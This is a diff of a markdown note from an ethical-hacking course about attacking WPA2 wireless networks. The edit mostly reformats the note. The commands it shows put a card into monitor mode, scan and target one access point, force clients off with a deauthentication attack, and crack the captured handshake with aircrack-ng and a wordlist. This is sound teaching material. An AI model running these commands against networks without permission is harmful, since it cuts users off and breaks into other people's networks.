@@ -10,6 +10,7 @@ By continued reading, you acknowledge the aforementioned user risks/responsibili
 
 Based off TheCyberMentor amazing Udemy course available at [https://www.udemy.com/course/practical-ethical-hacking/](https://www.udemy.com/course/practical-ethical-hacking/)
 
+# Wifi Pentesting Overview
 **Types Wireless Security:**
 WPA2 Pre Share Key (PSK) - “Everyday” seen security across wireless networks
 WPA2 Enterprise - Utilize Radius Servers/Credentials (advanced environments)
@@ -33,11 +34,12 @@ Tools used for Assessments:
 
 
 
-## Attacking Wireless Networks
+# Attacking Wireless Networks
 
 
 - Relys on poor password on wireless networks
 - After a WPA hand shake
+
 ## Setup Wireless Card on Kali
     iwconfig
 
@@ -45,7 +47,7 @@ Tools used for Assessments:
 
 
  
- **Place wireless card into monitor mode**
+ ## Place wireless card into monitor mode
 
 - kill process that would interfere with the wireless network
     airmong-ng check kill
@@ -54,7 +56,7 @@ Tools used for Assessments:
 
 
 
-**Start monitor mode**
+## Start monitor mode
 
     airmon-ng start wlan0
 
@@ -69,7 +71,7 @@ confirm with `iwconfig`
 
 
 
-**Searching nearby area of wifi networks**
+## Searching nearby area of wifi networks
 
     airodump-ng wlan0mon
 
@@ -86,7 +88,7 @@ confirm with `iwconfig`
 ![](https://paper-attachments.dropbox.com/s_0ECD1307AB8B03CAC9E54C16CBE9A470FE8843DA70DE01018AE4AC666B1B929A_1578150088860_image.png)
 
 
-**Narrow the wifi network down via airodump-ng**
+## Narrow the wifi network down via airodump-ng
 
     airodump-ng -c 6 --bssid 50:C7:BF:8A:00:73 -w capture wlan0mon
 
@@ -97,7 +99,7 @@ confirm with `iwconfig`
 
 if this was a larger network we would see more devices. 
 
-**Performing a DEAUTH attack**
+## Performing a DEAUTH attack
 
 - within a new window
 - might need to run the attack several times to get the deauth
@@ -111,12 +113,12 @@ if this was a larger network we would see more devices.
 
 Beacon rate began to increase which then led to the “WPA handshake”
 
-**Viewing captured data** 
+## Viewing captured data 
 
 ![](https://paper-attachments.dropbox.com/s_0ECD1307AB8B03CAC9E54C16CBE9A470FE8843DA70DE01018AE4AC666B1B929A_1578150613088_image.png)
 
 
-**Cracking the captured data**
+## Cracking the captured data
 
     aircrack-ng -w wordlist.txt -b 50:C7:BF:8A:00:73 capture-02.cap
 
